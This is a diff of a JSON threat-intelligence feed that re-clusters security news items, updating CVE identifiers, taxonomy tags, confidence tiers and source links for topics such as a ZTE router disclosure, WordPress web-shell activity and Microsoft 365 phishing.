           "actor_attribution": [],
           "affected_industries": [],
           "affected_products": [],
-          "tools_used": [
-            "npm",
-            "GitHub"
+          "tools_used": [],
+          "cve_ids": [
+            "CVE-2025-59199"
           ],
-          "cve_ids": [],
           "attack_techniques": [],
           "urgency_signals": [],
-          "content_type": "incident_report",
-          "confidence_tier": "tier_4_news",
-          "role_map": {
-            "npm": "tool",
-            "GitHub": "tool"
-          },
+          "content_type": "vulnerability_disclosure",
+          "confidence_tier": "tier_5_chatter",
+          "role_map": {},
           "weak_tags": {
             "products": []
           }
@@ -8443,32 +8574,115 @@
       },
       "corroborating_sources": [
         {
-          "source": "Infosecurity Magazine",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "AI-Generated npm Malware Leaks Its Own GitHub Token",
-          "link": "https://www.infosecurity-magazine.com/news/ai-npm-malware-leaks-github-token/",
-          "published": "2026-05-29T08:10:00+00:00",
-          "summary": "Sloppy AI-generated npm infostealer leaked its own GitHub token, exposing the operator",
+          "source": "Reddit r/blueteamsec",
+          "cohort": "reddit_practitioner_osint",
+          "title": "Click Or Trick (CVE-2025-59199): Escaping the Sandbox with Windows URIs",
+          "link": "https://www.reddit.com/r/blueteamsec/comments/1tso035/click_or_trick_cve202559199_escaping_the_sandbox/",
+          "published": "2026-05-31T07:01:45+00:00",
+          "summary": "submitted by /u/digicat [link] [comments]",
           "taxonomy": {
-            "threat_categories": [
-              "credential_theft"
-            ],
+            "threat_categories": [],
             "actor_attribution": [],
             "affected_industries": [],
             "affected_products": [],
-            "tools_used": [
-              "npm",
-              "GitHub"
+            "tools_used": [],
+            "cve_ids": [
+              "CVE-2025-59199"
             ],
-            "cve_ids": [],
             "attack_techniques": [],
             "urgency_signals": [],
-            "content_type": "incident_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {
-              "npm": "tool",
-              "GitHub": "tool"
-            },
+            "content_type": "vulnerability_disclosure",
+            "confidence_tier": "tier_5_chatter",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "cf5ba17e12",
+      "priority_score": 8,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [
+        "CVE-2021-21735"
+      ],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [
+          "CVE-2021-21735"
+        ],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "preauth_unauth"
+        ],
+        "content_type": [
+          "vulnerability_disclosure"
+        ],
+        "confidence_tier": [
+          "tier_5_chatter"
+        ]
+      },
+      "primary": {
+        "source": "Reddit r/netsec",
+        "cohort": "reddit_practitioner_osint",
+        "title": "CVE-2021-21735: ZTE H168N wizard whitelist exposed PPPoE and WLAN secrets pre-auth",
+        "link": "https://www.reddit.com/r/netsec/comments/1tnbcp1/cve202121735_zte_h168n_wizard_whitelist_exposed/",
+        "published": "2026-05-25T14:47:16+00:00",
+        "summary": "Disclosure/write-up for CVE-2021-21735 affecting the ZTE ZXHN H168N V3.5. The issue is cataloged as information disclosure, but the useful part is the authorization failure: wizard handlers under the setup surface exposed PPPoE and WLAN material that should have required authenticated configuration access. Firmware analysis points to a brittle whitelist decision around the QuickSetup flow, including routes such as wizard_pppoe_lua.lua and wizard_wlan_config_lua.lua . The write-up keeps secrets redacted and focuses on the route behavior, firmware logic, deployment-dependent admin compromise path, disclosure timeline, and the ZTE Low vs NVD Medium severity split. submitted by /u/TheReedemer69 [link] [comments]",
+        "full_body": "",
+        "fetch_status": "not_attempted",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [
+            "CVE-2021-21735"
+          ],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "preauth_unauth"
+          ],
+          "content_type": "vulnerability_disclosure",
+          "confidence_tier": "tier_5_chatter",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Reddit r/netsec",
+          "cohort": "reddit_practitioner_osint",
+          "title": "CVE-2021-21735: ZTE H168N wizard whitelist exposed PPPoE and WLAN secrets pre-auth",
+          "link": "https://www.reddit.com/r/netsec/comments/1tnbcp1/cve202121735_zte_h168n_wizard_whitelist_exposed/",
+          "published": "2026-05-25T14:47:16+00:00",
+          "summary": "Disclosure/write-up for CVE-2021-21735 affecting the ZTE ZXHN H168N V3.5. The issue is cataloged as information disclosure, but the useful part is the authorization failure: wizard handlers under the setup surface exposed PPPoE and WLAN material that should have required authenticated configuration access. Firmware analysis points to a brittle whitelist decision around the QuickSetup flow, including routes such as wizard_pppoe_lua.lua and wizard_wlan_config_lua.lua . The write-up keeps secrets redacted and focuses on the route behavior, firmware logic, deployment-dependent admin compromise path, disclosure timeline, and the ZTE Low vs NVD Medium severity split. submitted by /u/TheReedemer69 [link] [comments]",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [
+              "CVE-2021-21735"
+            ],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "preauth_unauth"
+            ],
+            "content_type": "vulnerability_disclosure",
+            "confidence_tier": "tier_5_chatter",
+            "role_map": {},
             "weak_tags": {
               "products": []
             }
@@ -8651,13 +8865,18 @@
         "affected_products": [
           "Linux kernel"
         ],
+        "cve_ids": [
+          "CVE-2026-43284",
+          "CVE-2026-43500"
+        ],
         "urgency_signals": [
+          "poc_available",
           "actively_exploited"
         ]
       },
       "cluster_count": 4,
       "article_count": 8,
-      "cohesion": 0.214,
+      "cohesion": 0.228,
       "shared_strong_signals": [
         "Linux kernel"
       ],
@@ -8676,6 +8895,81 @@
         "https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-05-29-2026",
         "https://thehackernews.com/2026/05/microsoft-patches-sharepoint-rce-flaw.html",
         "https://www.darkreading.com/vulnerabilities-threats/microsoft-issues-sharepoint-patch"
+      ]
+    },
+    {
+      "label": "web shell backdoor targeting WordPress",
+      "anchor_signal": "WordPress",
+      "theme_key": "wordpress",
+      "dominant_features": {
+        "threat_categories": [
+          "web_shell_backdoor"
+        ],
+        "affected_products": [
+          "WordPress"
+        ],
+        "urgency_signals": [
+          "preauth_unauth"
+        ]
+      },
+      "cluster_count": 3,
+      "article_count": 4,
+      "cohesion": 0.225,
+      "shared_strong_signals": [
+        "WordPress"
+      ],
+      "member_cves": [],
+      "also_targets": [],
+      "cluster_ids": [
+        "bd3bda8915",
+        "80b16de28f",
+        "89bb4c511f"
+      ],
+      "links": [
+        "https://www.exploit-db.com/exploits/52575",
+        "https://www.bleepingcomputer.com/news/security/wp-maps-pro-bug-exploited-to-create-admin-accounts-on-wordpress-sites/",
+        "https://www.exploit-db.com/exploits/52596",
+        "https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-05-29-2026"
+      ]
+    },
+    {
+      "label": "phishing social eng targeting Microsoft 365",
+      "anchor_signal": "Microsoft 365",
+      "theme_key": "microsoft-365",
+      "dominant_features": {
+        "threat_categories": [
+          "phishing_social_eng",
+          "credential_theft"
+        ],
+        "affected_industries": [
+          "critical_infrastructure"
+        ],
+        "affected_products": [
+          "Microsoft 365"
+        ]
+      },
+      "cluster_count": 4,
+      "article_count": 9,
+      "cohesion": 0.295,
+      "shared_strong_signals": [
+        "Microsoft 365"
+      ],
+      "member_cves": [],
+      "also_targets": [],
+      "cluster_ids": [
+        "faae644e55",
+        "50b10852eb",
+        "34b38eb5e3",
+        "bc44a35cd9"
+      ],
+      "links": [
+        "https://www.elastic.co/security-labs/tycoon-2fa-aitm-detection-engineering",
+        "https://www.reddit.com/r/sysadmin/comments/1ts8xo2/best_way_to_decommission_onedrive_for_desktop/",
+        "https://www.bitdefender.com/en-us/blog/hotforsecurity/fbi-kali365-phishing-kit-breaks-microsoft-365-accounts-no-password-required",
+        "https://www.infosecurity-magazine.com/news/fbi-kali365-phishing-kit-m365/",
+        "https://www.reddit.com/r/AskNetsec/comments/1tmwxl1/how_do_phishing_simulation_tools_work_with_real/",
+        "https://www.huntress.com/blog/why-hackers-don't-need-passwords-anymore",
+        "https://www.infosecurity-magazine.com/news/ai-npm-malware-leaks-github-token/"
       ]
     },
     {
@@ -8822,42 +9116,8 @@
         "https://thehackernews.com/2026/05/critical-gogs-rce-vulnerability-lets.html",
         "https://www.wiz.io/blog/threat-actors-target-crypto-orgs",
         "https://simonwillison.net/2026/May/30/how-we-contain-claude/#atom-everything",
-        "https://thehackernews.com/2026/05/jinx-0164-targets-cryptocurrency-firms.html",
-        "https://www.infosecurity-magazine.com/news/jinx-0164-crypto-developers-macos/"
-      ]
-    },
-    {
-      "label": "phishing social eng targeting Microsoft 365",
-      "anchor_signal": "Microsoft 365",
-      "theme_key": "microsoft-365",
-      "dominant_features": {
-        "threat_categories": [
-          "phishing_social_eng"
-        ],
-        "affected_products": [
-          "Microsoft 365"
-        ]
-      },
-      "cluster_count": 3,
-      "article_count": 8,
-      "cohesion": 0.369,
-      "shared_strong_signals": [
-        "Microsoft 365"
-      ],
-      "member_cves": [],
-      "also_targets": [],
-      "cluster_ids": [
-        "faae644e55",
-        "50b10852eb",
-        "34b38eb5e3"
-      ],
-      "links": [
-        "https://www.elastic.co/security-labs/tycoon-2fa-aitm-detection-engineering",
-        "https://www.reddit.com/r/sysadmin/comments/1ts8xo2/best_way_to_decommission_onedrive_for_desktop/",
-        "https://www.bitdefender.com/en-us/blog/hotforsecurity/fbi-kali365-phishing-kit-breaks-microsoft-365-accounts-no-password-required",
-        "https://www.infosecurity-magazine.com/news/fbi-kali365-phishing-kit-m365/",
-        "https://www.reddit.com/r/AskNetsec/comments/1tmwxl1/how_do_phishing_simulation_tools_work_with_real/",
-        "https://www.huntress.com/blog/why-hackers-don't-need-passwords-anymore"
+        "https://www.infosecurity-magazine.com/news/jinx-0164-crypto-developers-macos/",
+        "https://thehackernews.com/2026/05/jinx-0164-targets-cryptocurrency-firms.html"
       ]
     },
     {
@@ -8886,33 +9146,6 @@
         "https://orca.security/resources/blog/gitea-container-registry-vulnerability/",
         "https://thehackernews.com/2026/05/gitea-vulnerability-exposes-private.html",
         "https://www.securityweek.com/exploit-code-published-for-critical-flowise-rce-vulnerability/"
-      ]
-    },
-    {
-      "label": "WordPress vulnerability activity",
-      "anchor_signal": "WordPress",
-      "theme_key": "wordpress",
-      "dominant_features": {
-        "affected_products": [
-          "WordPress"
-        ]
-      },
-      "cluster_count": 2,
-      "article_count": 3,
-      "cohesion": 0.2,
-      "shared_strong_signals": [
-        "WordPress"
-      ],
-      "member_cves": [],
-      "also_targets": [],
-      "cluster_ids": [
-        "bd3bda8915",
-        "89bb4c511f"
-      ],
-      "links": [
-        "https://www.exploit-db.com/exploits/52575",
-        "https://www.bleepingcomputer.com/news/security/wp-maps-pro-bug-exploited-to-create-admin-accounts-on-wordpress-sites/",
-        "https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-05-29-2026"
       ]
     },
     {
@@ -9067,6 +9300,12 @@
           "first_published": "2026-05-26T00:00:00+00:00"
         },
         {
+          "value": "CVE-2026-1830",
+          "cluster_id": "80b16de28f",
+          "first_source": "Exploit-DB",
+          "first_published": "2026-05-29T00:00:00+00:00"
+        },
+        {
           "value": "CVE-2026-34926",
           "cluster_id": "76e5533edc",
           "first_source": "Check Point Research",
@@ -9091,6 +9330,24 @@
           "first_published": "2026-05-25T15:08:40+00:00"
         },
         {
+          "value": "CVE-2026-43284",
+          "cluster_id": "1a2336126b",
+          "first_source": "Exploit-DB",
+          "first_published": "2026-05-29T00:00:00+00:00"
+        },
+        {
+          "value": "CVE-2026-43500",
+          "cluster_id": "1a2336126b",
+          "first_source": "Exploit-DB",
+          "first_published": "2026-05-29T00:00:00+00:00"
+        },
+        {
+          "value": "CVE-2026-46300",
+          "cluster_id": "1a2336126b",
+          "first_source": "Exploit-DB",
+          "first_published": "2026-05-29T00:00:00+00:00"
+        },
+        {
           "value": "CVE-2026-31431",
           "cluster_id": "101998c91d",
           "first_source": "Datadog Security Labs",
@@ -9113,30 +9370,6 @@
           "cluster_id": "89bb4c511f",
           "first_source": "Rapid7",
           "first_published": "2026-05-29T19:34:41+00:00"
-        },
-        {
-          "value": "CVE-2026-43284",
-          "cluster_id": "89bb4c511f",
-          "first_source": "Rapid7",
-          "first_published": "2026-05-29T19:34:41+00:00"
-        },
-        {
-          "value": "CVE-2026-43500",
-          "cluster_id": "89bb4c511f",
-          "first_source": "Rapid7",
-          "first_published": "2026-05-29T19:34:41+00:00"
-        },
-        {
-          "value": "CVE-2026-41091",
-          "cluster_id": "22c0f52b2c",
-          "first_source": "Infosecurity Magazine",
-          "first_published": "2026-05-28T12:00:00+00:00"
-        },
-        {
-          "value": "CVE-2026-45498",
-          "cluster_id": "22c0f52b2c",
-          "first_source": "Infosecurity Magazine",
-          "first_published": "2026-05-28T12:00:00+00:00"
         }
       ],
       "actors": [
@@ -9229,6 +9462,12 @@
           "cluster_id": "2be6eea2c3",
           "first_source": "The Record",
           "first_published": "2026-05-28T14:01:00+00:00"
+        },
+        {
+          "value": "Lazarus",
+          "cluster_id": "bc44a35cd9",
+          "first_source": "Infosecurity Magazine",
+          "first_published": "2026-05-29T08:10:00+00:00"
         },
         {
           "value": "Kimsuky",
@@ -9335,6 +9574,12 @@
           "first_published": "2026-05-26T00:00:00+00:00"
         },
         {
+          "value": "WordPress",
+          "cluster_id": "80b16de28f",
+          "first_source": "Exploit-DB",
+          "first_published": "2026-05-29T00:00:00+00:00"
+        },
+        {
           "value": "Drupal",
           "cluster_id": "76e5533edc",
           "first_source": "Check Point Research",
@@ -9360,12 +9605,6 @@
         },
         {
           "value": "PyPI",
-          "cluster_id": "2272e85cad",
-          "first_source": "AWS Security Blog",
-          "first_published": "2026-05-26T17:03:30+00:00"
-        },
-        {
-          "value": "crates.io",
           "cluster_id": "2272e85cad",
           "first_source": "AWS Security Blog",
           "first_published": "2026-05-26T17:03:30+00:00"
@@ -9460,6 +9699,14 @@
         "primary_source": "Reddit r/blueteamsec",
         "strong_signals": [
           "CVE-2025-59199"
+        ]
+      },
+      {
+        "cluster_id": "cf5ba17e12",
+        "title": "CVE-2021-21735: ZTE H168N wizard whitelist exposed PPPoE and WLAN secrets pre-auth",
+        "primary_source": "Reddit r/netsec",
+        "strong_signals": [
+          "CVE-2021-21735"
         ]
       }
     ]
